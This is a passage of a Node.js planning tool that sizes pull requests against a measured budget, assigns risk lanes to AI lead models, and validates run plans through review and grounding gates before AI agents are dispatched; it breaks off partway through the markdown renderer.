#!/usr/bin/env node
// prep-runner — deterministic plumbing for /prep-for-work (the brain is the /prep-for-work session).
//
// WHY THIS EXISTS (measured, 2026-07-19 → 2026-07-25, five /work runs):
//   PR size is the multiplier on the whole bill. Dose-response across 25 PRs from four runs —
//     <1,000 additions → 1.25 review rounds · 1k–2.6k → 2.70 · 2.6k–5k → 3.38 · >7k → 5.67.
//   The run whose PRs averaged 3,754 additions took 8.0 kickbacks per merged PR and 776M tokens per
//   merged PR; the run whose PRs averaged 541 took 0.18 and 107M. Cost ≈ context × turns, and turns
//   (426 → 838 per issue) is what moved — per-turn context stayed flat. So: size the PR, cut the bill.
//
// The split of labour is deliberate. Classifying an issue's PROSE into surfaces is judgment — that is
// the session's job. Everything downstream of that classification is arithmetic and lockstep-file
// bookkeeping that a model gets wrong when it is tired at 2am — that is this file's job. Every number
// here is a measured baseline, not a guess, and `calibrate` exists because they WILL drift.
//
// Pure functions + a thin CLI. No network, no Linear. The grounding gates (query-check, symbol-check,
// priorart-check) shell out READ-ONLY to the repo (git/rg/file reads); nothing here writes outside the
// plan file. Run: node prep-runner.mjs <subcommand>

import { readFile, writeFile, access, mkdir } from "node:fs/promises";
// Sync, deliberately: `runEvidenceQuery` reproduces a `< file` redirect inside a spawnSync pipeline, and
// an await there would make the executor async for every caller to satisfy one rare redirect form.
import { readFileSync } from "node:fs";
import { spawnSync } from "node:child_process";
import { fileURLToPath } from "node:url";
import { resolve, join } from "node:path";

// ---------------------------------------------------------------------------
// The budget
// ---------------------------------------------------------------------------
// ≤ ~800 additions / ≤ ~12 files per PR. Not round numbers picked for taste: the <1k-additions bucket
// is the only one that averages ~1 review round, and the median change in the authoring repo is 10 files (3 of them
// registry boilerplate). A PR at this size merges in one round; every step above it buys rounds.
export const PLAN_BUDGET = { files: 12, additions: 800 };

// Unit id shapes. `DER-1234` = a Linear issue (issue mode). `SPEC-<slug>-U<n>` = a unit carved from one
// spec (spec mode) — see the spec-mode note in validatePlan. Both key the ledger identically.
export const LINEAR_ID_RE = /^[A-Z]+-\d+$/;
// Upper case is REQUIRED, not merely conventional: work-runner normalizes an operator-typed unit id to
// full upper case, so a plan entry named `SPEC-demo-U1` would never be matched by anything the operator
// types and would silently start a second, empty unit.
export const SPEC_UNIT_RE = /^SPEC-[A-Z0-9]+(?:-[A-Z0-9]+)*-U\d+$/;

// ---------------------------------------------------------------------------
// Surface fan-out table — what a change to each surface DRAGS WITH IT in this repo
// ---------------------------------------------------------------------------
// This is the table that would have caught U2/U3. "External operator authentication and execution" is
// a 98-file change BY CONSTRUCTION — command + mcp-tool + ui + api-route + protocol at once — and no
// amount of lead discipline shrinks it after dispatch. Sizing is only real if it is grounded in the
// actual lockstep files, so `verifySurfacePaths` re-checks them against the repo and fails loudly when
// one moves (a rotted table under-sizes silently, which is worse than no table).
//
// `additions` is the surface's own overhead ONLY — registry lines, wiring, the guide row. The issue's
// actual logic is counted separately as `coreUnits`.
export const SURFACES = {
  command: {
    label: "New or changed governed command",
    files: 8,
    additions: 200,
    axes: ["reference-guide"],
    // The lockstep set. Missing ANY of these is a guaranteed kickback round — `pnpm check:manifest`,
    // `check:docs-version`, `docs:check` and the registry tests each fail on a different one.
    paths: [
      "packages/commands/src/commands/index.ts",
      "packages/commands/src/references.ts",
      "packages/commands/src/operator-classification.ts",
      "apps/cli/src/generated/command-manifest.ts",
      "docs/specs/agent-native-command-surface.md",
      "docs/reference/governed-command-capability-matrix.md",
      "packages/reference/src/content.ts",
    ],
    note: "7 lockstep registry files + the command itself. `pnpm new:command` generates most of it. An OPTIONAL new arg still counts as an input-contract change; an OUTPUT-only field addition does NOT (bounded negative, #964).",
  },
  "mcp-tool": {
    label: "MCP tool surface",
    files: 3,
    additions: 90,
    axes: [],
    paths: ["apps/web/src/lib/mcp/command-tools.ts", "apps/web/src/lib/mcp/server.ts"],
    note: "command-tools + server wiring + its test.",
  },
  migration: {
    label: "DB migration",
    files: 3,
    additions: 130,
    axes: ["migration-number"],
    needsDocker: true,
    paths: ["packages/db/migrations", "packages/db/src/schema.ts", "docs/specs/database-schema.md"],
    note: "Numbered .sql + Drizzle schema + the schema spec. Pre-allocate the number with `pnpm db:next-migration`; re-derive at every rebase. Needs a Docker-capable host for the *.db.test.ts.",
  },
  "db-test": {
    label: "Real-Postgres test (RLS / cross-tenant)",
    files: 1,
    additions: 150,
    axes: [],
    needsDocker: true,
    paths: [],
    note: "Mandatory for a new tenant-scoped table (cross-tenant penetration test before merge).",
  },
  "reference-guide": {
    label: "Reference guide body + version bump",
    files: 1,
    additions: 60,
    axes: ["reference-guide"],
    paths: ["packages/reference/src/content.ts"],
    note: "LIVE version-holder axis (`check:docs-version`). Two PRs bumping the SAME guide to the SAME value look mergeable and the second fails the instant the first merges.",
  },
  ui: {
    label: "Web UI surface",
    files: 3,
    additions: 260,
    axes: [],
    paths: ["apps/web/src"],
    note: "Component + colocated test + route/parity wiring. A new executeUiTenantCommand call site also needs the command reclassified `ui` in agent-native-command-surface §17.8 or the fast unit job reds.",
  },
  "api-route": {
    label: "API route",
    files: 2,
    additions: 170,
    axes: [],
    paths: ["apps/web/src/app/api"],
    note: "route.ts + route.test.ts, withRouteErrors wired.",
  },
  protocol: {
    label: "Zod protocol schema",
    files: 2,
    additions: 140,
    axes: [],
    paths: ["packages/protocol/src"],
    note: "Schema + its test. Boundary validation is an invariant, not an option.",
  },
  prompt: {
    label: "Versioned prompt + eval",
    files: 2,
    additions: 90,
    axes: [],
    paths: ["packages/prompts"],
    note: "Prompt file with frontmatter + eval fixture; evals run in CI.",
  },
  job: {
    label: "Inngest background job",
    files: 2,
    additions: 160,
    axes: [],
    paths: ["apps/web/src"],
    note: "Idempotent + retried function and its test.",
  },
  docs: { label: "Docs / spec prose", files: 1, additions: 60, axes: [], paths: ["docs"], note: "" },
  adr: { label: "Architecture decision record", files: 1, additions: 120, axes: [], paths: ["docs/adr"], note: "" },
};

// One "core unit" = one distinct implementation concern: its impl file + its colocated test.
// Calibrated so that a typical one-command issue lands at ~9 files / ~500 additions — the shape of the
// PRs from the 0.18-kickback run (+326/8, +552/12, +657/5).
export const CORE_UNIT = { files: 2, additions: 300 };

// ---------------------------------------------------------------------------
// Sizing calibration — the multiplier the table is KNOWN to be off by
// ---------------------------------------------------------------------------
// Measured on run 20260727T004346Z (n=21, 24 merged PRs): delivered/assigned ran **4.79× on additions
// and 1.44× on files**. Read that carefully — the FILE count is modelled well; what the table misses is
// per-file line VOLUME, by roughly 3.3×. The consequence on that run: 18 of 24 PRs busted the additions
// budget, the median unit delivered 4.4× its assignment (DER-2505: 400 → 4,318), and the six PRs that
// DID meet budget produced 1 of the run's 36 kickbacks against 1.6–2.5 each for the ones that didn't.
//
// This is deliberately NOT baked into the table yet. The skill's own rule is to move SURFACES/CORE_UNIT
// only when the median ratio HOLDS ACROSS TWO RUNS, and this is one run — a table moved on a single
// sample is how a number nobody can defend becomes permanent. So it is a knob instead: `calibrate
// --apply` writes it here, and the next run either confirms it or corrects it. Until then the estimator
// reports the ratio alongside its raw number, so the planner sizes with the miss in view rather than
// discovering it at 3am.
//
// Override per-repo with `sizingCalibration` in the plan file, or via CALIBRATION below.
export const CALIBRATION = { additions: 1, files: 1, n: 0, measured: { additions: 4.79, files: 1.44, n: 21, run: "20260727T004346Z" } };

export function applyCalibration(est, cal = CALIBRATION) {
  const a = Number(cal?.additions) || 1;
  const f = Number(cal?.files) || 1;
  if (a === 1 && f === 1) return est;
  return { ...est, expectedAdditions: Math.round(est.expectedAdditions * a), expectedFiles: Math.round(est.expectedFiles * f), calibrated: { additions: a, files: f } };
}

// Split-axis lanes. An over-budget issue that spans two or more lanes has its split lines drawn for it;
// one that is over budget INSIDE a single lane has to be split by pipeline stage or class-member group
// instead, which is the harder judgment call and is flagged as such.
export const SPLIT_LANES = {
  data: ["migration", "db-test", "protocol"],
  command: ["command", "mcp-tool", "reference-guide"],
  web: ["ui", "api-route", "job"],
  docs: ["docs", "adr", "prompt"],
};

// ---------------------------------------------------------------------------
// Risk lanes → lead type
// ---------------------------------------------------------------------------
// Measured lead performance on the bad runs (avg rounds / merge rate): dsv4-flash 1.25/100% ·
// kimi 2.25/100% · opus-sonnet 3.3/82–100% · dsv4-pro 4.14/43% · gpt 5.33/100%. Carry the caveat
// honestly: on those runs model, review strictness and problem difficulty were CONFOUNDED — the
// hardest surface drew the stickiest review and the weakest leads at the same time. So this encodes
// the standing rule (governance/security/schema/money → Opus first-pass) rather than the leaderboard.
export const RISK_LANES = ["governance", "security", "invariant", "schema", "money", "mechanical", "ui", "docs"];
export const HIGH_RISK_LANES = new Set(["governance", "security", "invariant", "schema", "money"]);
// Never first-pass a high-risk lane on these.
export const HIGH_RISK_FORBIDDEN_LEADS = new Set(["dsv4", "dsv4-flash"]);
// Allowed but noted — non-Claude leads on a high-risk lane get one round, then re-spawn on claude.
export const HIGH_RISK_DISCOURAGED_LEADS = new Set(["kimi", "gpt"]);

// ---------------------------------------------------------------------------
// Step 2 — size an issue against the real codebase
// ---------------------------------------------------------------------------
/**
 * @param {{surfaces?: string[], coreUnits?: number, extraFiles?: number, extraAdditions?: number,
 *          budget?: {files: number, additions: number}}} input
 */
export function sizeIssue(input = {}) {
  const budget = { ...PLAN_BUDGET, ...(input.budget ?? {}) };
  const surfaces = [...new Set(input.surfaces ?? [])];
  const unknown = surfaces.filter((s) => !SURFACES[s]);
  if (unknown.length) throw new Error(`unknown surface(s): ${unknown.join(", ")} — known: ${Object.keys(SURFACES).join(", ")}`);
  const coreUnits = Number.isFinite(input.coreUnits) ? Math.max(0, Math.trunc(input.coreUnits)) : 1;
  const extraFiles = Math.max(0, Math.trunc(input.extraFiles ?? 0));
  const extraAdditions = Math.max(0, Math.trunc(input.extraAdditions ?? 0));

  let files = coreUnits * CORE_UNIT.files + extraFiles;
  let additions = coreUnits * CORE_UNIT.additions + extraAdditions;
  const axes = new Set();
  let needsDocker = false;
  for (const key of surfaces) {
    const s = SURFACES[key];
    files += s.files;
    additions += s.additions;
    for (const a of s.axes) axes.add(a);
    if (s.needsDocker) needsDocker = true;
  }

  const overBy = { files: files - budget.files, additions: additions - budget.additions };
  const overBudget = overBy.files > 0 || overBy.additions > 0;
  const splitInto = Math.max(1, Math.ceil(Math.max(files / budget.files, additions / budget.additions)));
  return {
    surfaces,
    coreUnits,
    expectedFiles: files,
    expectedAdditions: additions,
    versionAxes: [...axes],
    needsDocker,
    budget,
    overBudget,
    overBy,
    splitInto,
    ...(overBudget ? { split: suggestSplit(surfaces, splitInto) } : {}),
    // The empirical dose-response, applied to THIS estimate — the number that makes the case to a
    // human deciding whether the split is worth the effort.
    expectedRounds: expectedRounds(additions),
  };
}

// Dose-response bucket → avg kickback rounds (25 PRs, four runs).
export function expectedRounds(additions) {
  if (additions < 1000) return 1.25;
  if (additions < 2600) return 2.7;
  if (additions < 5000) return 3.38;
  return 5.67;
}

// Which lanes an issue's surfaces fall into, and therefore where the split lines are.
export function suggestSplit(surfaces = [], splitInto = 2) {
  const lanes = [];
  for (const [lane, keys] of Object.entries(SPLIT_LANES)) {
    const hit = surfaces.filter((s) => keys.includes(s));
    if (hit.length) lanes.push({ lane, surfaces: hit });
  }
  if (lanes.length >= 2) {
    return {
      axis: "surface",
      children: Math.max(splitInto, lanes.length),
      groups: lanes,
      how: `Split by surface lane: ${lanes.map((l) => `${l.lane} (${l.surfaces.join("+")})`).join(" · ")}. Each child must be independently mergeable and independently valuable — a child that only makes sense once its sibling merges is a dependency, so record it in dependsOn and NAME the sibling contract in its brief.`,
    };
  }
  return {
    axis: "stage-or-class",
    children: splitInto,
    groups: lanes,
    how: `Single-lane overflow — no surface seam to cut on. Split by pipeline stage (read path / write path / enforcement) or by class-member group (fix the class across sites A–C in one PR, D–F in the next). Enumerate the class members NOW and put the table in each child's brief: ~80% of repeat kickbacks were "same class, new site", the reviewer finding siblings one round at a time.`,
  };
}

// Guard against table rot: every path this table claims must still exist in the repo.
export async function verifySurfacePaths(repoRoot) {
  const results = [];
  for (const [key, s] of Object.entries(SURFACES)) {
    for (const p of s.paths ?? []) {
      let ok = true;
      try { await access(join(repoRoot, p)); } catch { ok = false; }
      results.push({ surface: key, path: p, ok });
    }
  }
  return { ok: results.every((r) => r.ok), results, missing: results.filter((r) => !r.ok) };
}

// ---------------------------------------------------------------------------
// Steps 3–7 — the plan, and what makes one dispatchable
// ---------------------------------------------------------------------------
// validatePlan is the gate between "we thought about it" and "the run may start". Every check here
// corresponds to a failure that actually happened and cost a night: an over-budget unit dispatched as
// one PR, two PRs holding the same version axis, a governance issue first-passed on a cheap lead, a
// founder question left open and hit at 3am when nobody could answer it.
export function validatePlan(plan, opts = {}) {
  const budget = { ...PLAN_BUDGET, ...(opts.budget ?? {}) };
  const errors = [];
  const warnings = [];
  const E = (id, msg) => errors.push(id ? `${id}: ${msg}` : msg);
  const W = (id, msg) => warnings.push(id ? `${id}: ${msg}` : msg);
  // Grounding gate 2 (2026-07-29): an evidence query must have been RUN against a window where it is
  // KNOWN to return hits, or it is a check that cannot fail. One helper shared by the per-issue and
  // plan-level loops so the two cannot drift apart (the SQL-mirrors-validator class, applied to ourselves).
  const gateEvidenceQuery = (scopeId, qi, q) => {
    const label = `evidenceQueries[${qi}]${q?.name ? ` "${q.name}"` : ""}`;
    // Shape AND shell safety, both here: the operator must see the refusal in `validate`, BEFORE
    // query-check spawns anything. A plan is assembled from issue prose and lead output, so an
    // evidence query is semi-trusted text that this tool otherwise hands straight to a shell.
    const probs = [...evidenceQueryProblems(q), ...(q?.query?.trim?.() ? evidenceQueryShellProblems(q.query) : [])];
    for (const p of probs) E(scopeId, `${label}: ${p}`);
    if (probs.length) return;
    if (!Number.isFinite(q.observed?.count)) {
      E(scopeId, `${label}: never validated against its known-positive window — run \`query-check --record\`. The 07-28 kill criterion's grep matched 2 of the 6 commits its own plan cited; it would have returned zero and auto-selected "delete the tool" while the problem recurred.`);
    } else if (q.observed.failed) {
      // Checked BEFORE the count and independently of it: `query-check` stamps 0 on a failed run, but 0
      // is also a legitimate measurement, so the count alone cannot tell the two apart. Without this
      // branch a hand-edited or re-stamped count would buy a query that never ran a pass here (DER-2783).
      E(scopeId, `${label}: its last \`query-check\` run FAILED — the query exited nonzero or was killed, so its stamped count is a fail-closed 0, not a measurement. A query that cannot run is not evidence: fix the QUERY, then re-run \`query-check --record\`.`);
    } else if (q.observed.count < q.expectAtLeast) {
      E(scopeId, `${label}: returned ${q.observed.count} < ${q.expectAtLeast} on its known-positive window (${q.window}) — the query is BLIND to the history it cites; fix the QUERY, not the floor`);
    }
  };

  if (!plan || typeof plan !== "object") return { ok: false, errors: ["plan is not an object"], warnings };
  const issues = Array.isArray(plan.issues) ? plan.issues : null;
  if (!issues) return { ok: false, errors: ["plan.issues must be an array"], warnings };
  if (!issues.length) return { ok: false, errors: ["plan.issues is empty"], warnings };

  // SPEC MODE (2026-07-29). A plan may name its units either as Linear ids (`DER-1234`) or as spec
  // units (`SPEC-<slug>-U<n>`) carved from ONE spec tracked by ONE Linear issue. Spec mode exists
  // because the recurring defect in issue mode is a lead inventing its own shape — it cannot see the
  // sibling contract, which is why AGENTS.md has to instruct briefs to NAME it. A spec shows the whole
  // shape by construction. What spec mode does NOT relax is anything below this line: budgets, risk
  // lanes, version-axis serialization and the plan-review gate are identical in both modes, because
  // those are what the measurements actually support.
  const isSpecMode = Boolean(plan.specRef || plan.tracking || issues.some((i) => SPEC_UNIT_RE.test(i?.id ?? "")));
  if (isSpecMode) {
    if (!plan.specRef) E(null, `spec mode needs "specRef" — the spec document these units implement`);
    if (!plan.tracking || !LINEAR_ID_RE.test(plan.tracking)) {
      E(null, `spec mode needs "tracking": a single Linear id standing for the whole spec. Without it the run is invisible outside this plan file — no status, no history, nothing for anyone who does not read the ledger.`);
    }
  }

  const byId = new Map();
  for (const it of issues) {
    const idOk = it && typeof it === "object" && typeof it.id === "string"
      && (LINEAR_ID_RE.test(it.id) || SPEC_UNIT_RE.test(it.id));
    if (!idOk) {
      E(null, `every unit needs an id — either a Linear id like DER-1234, or a spec unit like SPEC-<slug>-U1 (got ${JSON.stringify(it?.id)})`);
      continue;
    }
    if (byId.has(it.id)) E(it.id, "listed twice");
    byId.set(it.id, it);
  }

  // Bundled EXTRA ids are members of their primary's unit, not standalone plan entries.
  const bundledAway = new Set();
  for (const it of issues) for (const b of it.bundleWith ?? []) if (b !== it.id) bundledAway.add(b);

  for (const it of issues) {
    const id = it.id;
    if (!id || !byId.has(id)) continue;

    // --- budget: the whole point of the phase
    const b = it.budget;
    if (!b || !Number.isFinite(b.files) || !Number.isFinite(b.additions)) {
      E(id, "no assigned budget — every issue needs budget:{files,additions}; an un-budgeted unit is an unbounded one");
    } else {
      if (b.files > budget.files || b.additions > budget.additions) {
        const n = Math.max(1, Math.ceil(Math.max(b.files / budget.files, b.additions / budget.additions)));
        E(id, `budget ${b.files} files / ${b.additions} additions exceeds the cap (${budget.files}/${budget.additions}) — split it into ~${n} PR-sized children in Linear BEFORE the run (expect ~${expectedRounds(b.additions)} review rounds at this size vs 1.25 under 1k)`);
      }
      if (b.files <= 0 || b.additions <= 0) E(id, "budget must be positive");
    }

    // --- surfaces
    for (const s of it.surfaces ?? []) if (!SURFACES[s]) E(id, `unknown surface "${s}" (known: ${Object.keys(SURFACES).join(", ")})`);
    if (!Array.isArray(it.surfaces) || !it.surfaces.length) W(id, "no surfaces declared — sizing was not grounded in the codebase; grep the touch points");

    // --- risk lane → lead type
    if (!it.riskLane || !RISK_LANES.includes(it.riskLane)) E(id, `riskLane must be one of: ${RISK_LANES.join(", ")}`);
    if (!it.leadType) E(id, "no leadType assigned");
    if (HIGH_RISK_LANES.has(it.riskLane)) {
      if (HIGH_RISK_FORBIDDEN_LEADS.has(it.leadType)) {
        E(id, `riskLane "${it.riskLane}" must not first-pass on "${it.leadType}" — governance/security/invariant/schema/money go to an Opus-class lead (dsv4-pro measured 4.14 rounds / 43% merge on exactly this kind of surface)`);
      } else if (HIGH_RISK_DISCOURAGED_LEADS.has(it.leadType)) {
        W(id, `riskLane "${it.riskLane}" on "${it.leadType}" — allowed, but enforce the one-round rule: re-spawn on claude at the FIRST kickback, not the second`);
      }
    }

    // --- MANDATORY plan review (2026-07-29). Reviewing the plan is the cheapest moment to catch a
    // finding the cloud reviewer would otherwise write against the PR: a plan edit costs one re-brief,
    // the same finding on a PR costs a review round (~100-150M tokens, ~$35-50). Measured on the
    // 2026-07-27 run, review rounds were the dominant recycle cost and 36 kickbacks landed across 24 PRs.
    // An explicit skip is allowed, because codex is genuinely unavailable on some hosts — but it must be
    // WRITTEN DOWN with a reason, so "we skipped it" can never be confused with "it passed".
    if (!opts.skipPlanReview) {
      if (!it.planReview && !it.planReviewSkipped) {
        E(id, `no plan review recorded — run \`plan-review ${id}\` then \`plan-review-record\`. To skip deliberately, set planReviewSkipped:{why:"…"}. Never leave it absent: an absent gate and a passed gate look identical downstream.`);
      } else if (it.planReviewSkipped && !it.planReviewSkipped.why) {
        E(id, "planReviewSkipped needs a `why` — an unexplained skip is indistinguishable from a forgotten one");
      } else if (it.planReview?.verdict === "plan is wrong") {
        E(id, `plan review verdict is "plan is wrong" — rewrite the plan entry before dispatching it`);
      } else if (it.planReview && (it.planReview.commands ?? 0) < 1) {
        E(id, `plan review recorded with 0 repository commands — that reviewer never opened the repo, so its findings are unfalsifiable (DER-2504). Re-run the gate.`);
      } else if (it.planReview?.verdict === "plan has gaps" && !(it.watchOuts ?? []).length) {
        W(id, `plan review says "plan has gaps" but recorded no watch-outs — check the review actually produced instructions the lead can implement toward`);
      }
      if (it.planReview?.sizeChallenge && !it.splitFrom) {
        W(id, `plan review challenged the size: "${it.planReview.sizeChallenge}" — confirm the budget or split before dispatch`);
      }
    }

    // --- grounding gates (2026-07-29): what a plan entry CLAIMS must be grounded, not asserted. A plan
    // in this repo shipped SIX vacuous checks while its author explicitly cited "a check that cannot
    // fail is not evidence" and revised twice hunting that exact class — attention does not prevent
    // this; arithmetic does. (Gate 4, prior-art, is advisory — after the loop.)
    if (it.checks !== undefined && !Array.isArray(it.checks)) E(id, "checks must be an array");
    for (const [ci, c] of (Array.isArray(it.checks) ? it.checks : []).entries()) {
      for (const p of checkEntryProblems(c)) E(id, `checks[${ci}]${c?.name ? ` "${c.name}"` : ""}: ${p}`);
    }
    if (it.evidenceQueries !== undefined && !Array.isArray(it.evidenceQueries)) E(id, "evidenceQueries must be an array");
    for (const [qi, q] of (Array.isArray(it.evidenceQueries) ? it.evidenceQueries : []).entries()) gateEvidenceQuery(id, qi, q);
    if (it.symbols !== undefined && !Array.isArray(it.symbols)) E(id, "symbols must be an array");
    for (const [si, s] of (Array.isArray(it.symbols) ? it.symbols : []).entries()) {
      const label = `symbols[${si}]${s?.name ? ` "${s.name}"` : ""}`;
      const probs = symbolShapeProblems(s);
      for (const p of probs) E(id, `${label}: ${p}`);
      if (probs.length) continue;
      const use = s.use ?? "test";
      if (!s.resolved?.status) {
        E(id, `${label}: never resolved against the repo — run \`symbol-check --record\`. A brief was written demanding a behavioral test of a non-exported function; the lead burns a full round discovering that.`);
      } else if (s.resolved.status === "not-found") {
        E(id, `${label}: NOT FOUND in ${s.from} — the plan names a target that is not there; fix the plan, not the repo`);
      } else if (s.resolved.status === "private" && use !== "edit") {
        E(id, `${label}: PRIVATE in ${s.from} — unimplementable as a ${use} target as written. Re-scope to the public entry that reaches it; exporting a private function solely so a test can import it is the shape AGENTS.md's test-binds-symbol rule rejects. (Mark use:"edit" if the plan only modifies it in place.)`);
      }
    }
    if (it.priorArt?.checkedAt && (it.priorArt.candidates?.length ?? 0) > 0 && !it.priorArt.disposition) {
      W(id, `prior-art sweep found ${it.priorArt.candidates.length} candidate(s) and no disposition — JUDGE them and record the call in priorArt.disposition (cut or narrow the issue in Linear if something already covers it)`);
    }

    // --- unresolved founder gates: the reason this phase is PRE-run
    const gate = it.gate ?? it.openQuestion;
    if (gate && !(typeof gate === "object" ? gate.answer : false)) {
      E(id, `unresolved gate (${typeof gate === "string" ? gate : gate.q ?? "?"}) — resolve it in writing now or HOLD THIS ISSUE OUT of the run. There are no mid-run human gates: one blocking question on 07-25 cost ~4h15m, killed two fixers and stranded three finished commits in draft.`);
    }

    // --- dependencies must exist, be acyclic, and NAME the contract they build on
    for (const dep of it.dependsOn ?? []) {
      if (!byId.has(dep) && !bundledAway.has(dep)) E(id, `dependsOn "${dep}" is not in this plan`);
      if (!it.notes) W(id, `depends on ${dep} but has no notes — a brief that builds on a sibling must NAME the merged contract it builds on ("build ON ${dep}'s merged registry shape"), or the lead invents its own shape`);
    }

    // --- bundling policy: never to save CI
    for (const other of it.bundleWith ?? []) {
      if (other === id) continue;
      const o = byId.get(other);
      if (!o) continue; // a bundled extra need not be its own plan entry
      if (HIGH_RISK_LANES.has(o.riskLane) || HIGH_RISK_LANES.has(it.riskLane)) {
        E(id, `bundles ${other} but one of them is in a risk lane — bundle only mechanical work`);
      }
      const combinedFiles = (it.budget?.files ?? 0) + (o.budget?.files ?? 0);
      const combinedAdds = (it.budget?.additions ?? 0) + (o.budget?.additions ?? 0);
      if (combinedFiles > budget.files || combinedAdds > budget.additions) {
        E(id, `bundling ${other} puts the COMBINED unit at ${combinedFiles} files / ${combinedAdds} additions, over the cap — bundling to save CI loses 3–7× (≈$2–5 CI per PR vs ~$35–50 for one extra review round)`);
      }
    }
  }

  // --- cycles
  for (const cycle of findCycles(issues)) E(null, `dependency cycle: ${cycle.join(" → ")}`);

  // --- version-holder axes must be serialized
  // Two PRs bumping the SAME axis to the SAME value look mergeable (git auto-resolves identical
  // changes) and the second fails its guard the instant the first merges.
  const serialGroups = (plan.serialization ?? []).map((g) => new Set(g));
  const holders = new Map();
  for (const it of issues) for (const axis of it.versionAxes ?? []) {
    if (!holders.has(axis)) holders.set(axis, []);
    holders.get(axis).push(it.id);
  }
  for (const [axis, ids] of holders) {
    if (ids.length < 2) continue;
    // A migration-NUMBER axis is fine concurrently as long as the numbers were pre-allocated distinct.
    if (axis.startsWith("migration:")) { /* distinct numbers are distinct axes */ }
    const serialized = serialGroups.some((g) => ids.every((i) => g.has(i)));
    const bundled = issues.some((it) => ids.every((i) => i === it.id || (it.bundleWith ?? []).includes(i)));
    if (!serialized && !bundled) {
      E(null, `${ids.join(" + ")} all hold version axis "${axis}" — serialize them (plan.serialization) or bundle them. Re-derive holder status from the CURRENT diff after every kickback round: a P1 fix can ADD an axis a PR did not hold at open time.`);
    }
  }

  // --- plan-level evidence queries (kill criteria and the like) gate identically to per-issue ones
  if (plan.evidenceQueries !== undefined && !Array.isArray(plan.evidenceQueries)) E(null, "evidenceQueries must be an array");
  for (const [qi, q] of (Array.isArray(plan.evidenceQueries) ? plan.evidenceQueries : []).entries()) gateEvidenceQuery(null, qi, q);

  // --- gate 4 (prior art) is ADVISORY: warn, never refuse. The sweep is heuristic and the judgement is
  // a human's — a refuse-gate satisfied by heuristic noise trains the operator to rubber-stamp it.
  const unswept = issues.filter((i) => i?.id && byId.has(i.id) && !i.priorArt?.checkedAt);
  if (unswept.length) {
    W(null, `${unswept.length} issue(s) carry no prior-art sweep (${unswept.slice(0, 6).map((i) => i.id).join(", ")}${unswept.length > 6 ? ", …" : ""}) — run \`priorart-check --record\`: two of one wave's planned deliverables already existed in full (the test at cli-adapter.test.ts:1148, the collision guard scripts/db-next-migration.mjs)`);
  }

  // --- decisions must actually be decided
  for (const d of plan.decisions ?? []) {
    if (!d || !d.q) E(null, "a decisions[] entry has no question");
    else if (!d.a) E(null, `decision "${d.q}" has no recorded answer — decide it now; it becomes a mid-run gate otherwise`);
  }
  if (!plan.decisions?.length) W(null, "no decisions recorded — sweep the set for anything that would become a mid-run question; 'none found' is a valid answer but should be an explicit one");

  for (const g of plan.serialization ?? []) if (g.length < 2) W(null, `serialization group ${JSON.stringify(g)} has fewer than 2 members`);

  return { ok: errors.length === 0, errors, warnings };
}

function findCycles(issues = []) {
  const graph = new Map(issues.map((i) => [i.id, i.dependsOn ?? []]));
  const cycles = [];
  const state = new Map();
  const stack = [];
  const visit = (id) => {
    if (state.get(id) === "done") return;
    if (state.get(id) === "open") {
      cycles.push([...stack.slice(stack.indexOf(id)), id]);
      return;
    }
    state.set(id, "open");
    stack.push(id);
    for (const dep of graph.get(id) ?? []) if (graph.has(dep)) visit(dep);
    stack.pop();
    state.set(id, "done");
  };
  for (const i of issues) visit(i.id);
  return cycles;
}

// The assigned budget for one dispatch UNIT. A bundle ships as one PR, so its budget is the sum of its
// members' — which is exactly the number `write-brief` must stamp into the lead's brief.
export function budgetFor(plan, issueId, seen = new Set()) {
  const issues = plan?.issues ?? [];
  // A bundled EXTRA resolves to its PRIMARY's unit even when it also has its own plan entry — the
  // bundle is one branch, one PR, one budget, and the lead is briefed on the whole unit.
  const owner = issues.find((i) => i.id !== issueId && (i.bundleWith ?? []).includes(issueId));
  if (owner && !seen.has(owner.id)) return budgetFor(plan, owner.id, new Set([...seen, issueId]));
  const entry = issues.find((i) => i.id === issueId);
  if (!entry) return null;
  const members = [entry, ...(entry.bundleWith ?? []).filter((b) => b !== issueId).map((b) => issues.find((i) => i.id === b)).filter(Boolean)];
  const files = members.reduce((s, m) => s + (m.budget?.files ?? 0), 0);
  const additions = members.reduce((s, m) => s + (m.budget?.additions ?? 0), 0);
  if (!files && !additions) return null;
  return {
    files,
    additions,
    issues: members.map((m) => m.id),
    surfaces: [...new Set(members.flatMap((m) => m.surfaces ?? []))],
    riskLane: entry.riskLane ?? null,
    leadType: entry.leadType ?? null,
    versionAxes: [...new Set(members.flatMap((m) => m.versionAxes ?? []))],
    dependsOn: [...new Set(members.flatMap((m) => m.dependsOn ?? []))],
    notes: entry.notes ?? null,
    splitFrom: entry.splitFrom ?? null,
  };
}

// ---------------------------------------------------------------------------
// Step 8 — emit
// ---------------------------------------------------------------------------
export function renderPlanMd(plan = {}) {
  const issues = plan.issues ?? [];
  const totalAdds = issues.reduce((s, i) => s + (i.budget?.additions ?? 0), 0);
  const lines = [
    `# Run plan — ${plan.label ?? plan.project ?? "work"}${plan.date ? ` (${plan.date})` : ""}`,
    ``,
    `${issues.length} dispatchable units · ${totalAdds.toLocaleString("en-US")} planned additions · budget ${PLAN_BUDGET.files} files / ${PLAN_BUDGET.additions} additions per PR`,
    ``,
    `| Issue | Budget (files/adds) | Surfaces | Risk lane | Lead | Version axes | Depends on | Bundle |`,
    `|---|---:|---|---|---|---|---|---|`,
    ...issues.map((i) => [
      i.id,
      `${i.budget?.files ?? "?"} / ${i.budget?.additions ?? "?"}`,
      (i.surfaces ?? []).join(", ") || "—",
      i.riskLane ?? "—",
      i.leadType ?? "—",
      (i.versionAxes ?? []).join(", ") || "—",
      (i.dependsOn ?? []).join(", ") || "—",
      (i.bundleWith ?? []).filter((b) => b !== i.id).join(", ") || "—",
    ].join(" | ")).map((r) => `| ${r} |`),
    ``,
  ];
  const splits = issues.filter((i) => i.splitFrom);
  if (splits.length) {
    lines.push(`## Splits made in Linear`, ``);
    const from = new Map();
    for (const s of splits) {
      if (!from.has(s.splitFrom)) from.set(s.splitFrom, []);
      from.get(s.splitFrom).push(s.id);
    }
    for (const [parent, kids] of from) lines.push(`- **${parent}** → ${kids.join(", ")}`);
    lines.push(``);
  }
  if (plan.serialization?.length) {
    lines.push(`## Serialization (version-holder axes)`, ``);
    for (const g of plan.serialization) lines.push(`- ${g.join(" → ")}`);
    lines.push(``, `Re-derive holder status from the CURRENT diff after every kickback round — a P1 fix can add an axis the PR did not hold at open time.`, ``);
  }
  if (plan.heldOut?.length) {
    lines.push(`## Held OUT of this run`, ``);
